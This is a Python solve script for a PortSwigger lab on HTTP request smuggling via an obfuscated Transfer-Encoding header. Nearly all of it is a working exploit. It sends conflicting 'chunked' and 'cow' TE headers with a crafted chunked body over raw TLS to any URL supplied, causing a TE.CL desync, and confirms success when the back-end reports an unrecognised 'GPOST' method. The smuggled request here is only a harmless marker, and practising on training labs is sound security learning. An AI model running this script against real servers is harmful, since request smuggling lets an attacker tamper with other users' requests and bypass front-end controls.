#!/usr/bin/env python3
"""
Solve script for PortSwigger Lab: HTTP request smuggling, obfuscating the TE header.

Both servers support Transfer-Encoding. We send two conflicting TE headers:
    Transfer-Encoding: chunked
    Transfer-encoding: cow
One server picks `chunked`, the other picks `cow`, fails to recognize it,
and falls back to Content-Length — producing a TE.CL desync.

Raw TLS sockets because `requests` normalizes duplicate headers.
"""

import argparse
import socket
import ssl
from urllib.parse import urlparse


SMUGGLE_TEMPLATE = (
    "POST / HTTP/1.1\r\n"
    "Host: {host}\r\n"
    "Content-Type: application/x-www-form-urlencoded\r\n"
    "Content-length: 4\r\n"
    "Transfer-Encoding: chunked\r\n"
    "Transfer-encoding: cow\r\n"
    "\r\n"
    "5c\r\n"
    "GPOST / HTTP/1.1\r\n"
    "Content-Type: application/x-www-form-urlencoded\r\n"
    "Content-Length: 15\r\n"
    "\r\n"
    "x=1\r\n"
    "0\r\n"
    "\r\n"
)


def send_sequence(host: str, port: int, body: bytes, count: int = 2) -> list[bytes]:
    ctx = ssl.create_default_context()
    responses = []
    with socket.create_connection((host, port), timeout=10) as sock:
        with ctx.wrap_socket(sock, server_hostname=host) as ssock:
            ssock.settimeout(5)
            for _ in range(count):
                ssock.sendall(body)
                data = b""
                try:
                    while True:
                        chunk = ssock.recv(4096)
                        if not chunk:
                            break
                        data += chunk
                        if b"\r\n\r\n" in data and len(data) > 100:
                            break
                except socket.timeout:
                    pass
                responses.append(data)
    return responses


def main():
    parser = argparse.ArgumentParser(description="Solve HTTP Request Smuggling Lab 3 (obfuscated TE)")
    parser.add_argument("lab_url", help="Lab URL")
    args = parser.parse_args()

    parsed = urlparse(args.lab_url)
    host = parsed.hostname
    port = parsed.port or 443

    body = SMUGGLE_TEMPLATE.format(host=host).encode()

    print(f"[*] Sending TE-obfuscated smuggle twice to {host}:{port}")
    responses = send_sequence(host, port, body)

    for i, r in enumerate(responses, 1):
        head = r.split(b"\r\n\r\n", 1)[0].decode(errors="replace")
        print(f"\n[+] Response {i} headers:\n{head[:400]}")

    if b"GPOST" in responses[-1] or b"Unrecognized method" in responses[-1]:
        print("\n[+] Smuggling confirmed — back-end saw 'GPOST'. Lab should be solved.")
    else:
        print("\n[-] Didn't see 'Unrecognized method GPOST'.")


if __name__ == "__main__":
    main()
